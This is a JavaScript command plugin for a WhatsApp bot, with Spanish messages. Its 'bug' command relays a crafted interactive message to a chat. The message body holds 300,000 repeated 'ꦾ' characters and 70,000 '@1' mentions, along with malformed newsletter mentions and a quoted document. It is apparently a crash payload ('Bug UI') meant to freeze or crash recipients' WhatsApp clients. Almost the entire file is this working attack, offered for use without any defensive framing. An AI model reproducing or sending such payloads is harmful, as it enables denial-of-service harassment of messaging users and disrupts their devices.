const systemUi3 = async (rxhl, target) => {
  await rxhl.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30623531_8925861100811717_6603685184702665673_n.enc?ccb=11-4&oh=01_Q5AaIN8EZu9FKxglUrb240_UXS3DGwZHc6a_fKzCxAbB1DFB&oe=675EE231&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/json",
              fileSha256: "ZUQzs6adM+DC5ZI3MuHr3RbsAaj66LvmZ1R8+El5cqc=",
              fileLength: "401",
              pageCount: 0,
              mediaKey: "X6f0YZpo7xItqTXuawYmZJy6eLaXv9m/1nFZq2rW7p0=",
              fileName: "😘😘".repeat(10),
              fileEncSha256: "6gmEaQ6o3q7TgsBLKLYlr8sJmbb+yYxpYLuQ1F4vbBs=",
              directPath: "/v/t62.7119-24/30623531_8925861100811717_6603685184702665673_n.enc?ccb=11-4&oh=01_Q5AaIN8EZu9FKxglUrb240_UXS3DGwZHc6a_fKzCxAbB1DFB&oe=675EE231&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1731681321"
            },
            hasMediaAttachment: true
          },
          body: {
            text: "ꦾ".repeat(300000) + "@1".repeat(70000)
          },
          nativeFlowMessage: {},
          contextInfo: {
            mentionedJid: ["1@newsletter"],
            groupMentions: [{
              groupJid: "1@newsletter",
              groupSubject: "RxhL"
            }],
            quotedMessage: {
              documentMessage: {
                contactVcard: true
              }
            }
          }
        }
      }
    }
  }, {
    participant: {
      jid: target
    }
  }, {
    messageId: null
  });

  console.clear();
  console.log("\x1b[33m%s\x1b[0m", `✅ Bug UI enviado correctamente`);
};

let handler = async (m, { conn, isOwner, args, usedPrefix, command }) => {
  if (!isOwner) throw `⛔ Este comando es solo para el Owner del bot`;

  const target = m.chat;
  await systemUi3(conn, target);
  await m.reply('✅ *Bug UI3 enviado correctamente.*\n⚠️ Úsalo bajo tu propio riesgo.');
};

handler.command = /^bug$/i;
handler.owner = true;
handler.tags = ['owner'];
handler.help = ['bugui3'];

export default handler;
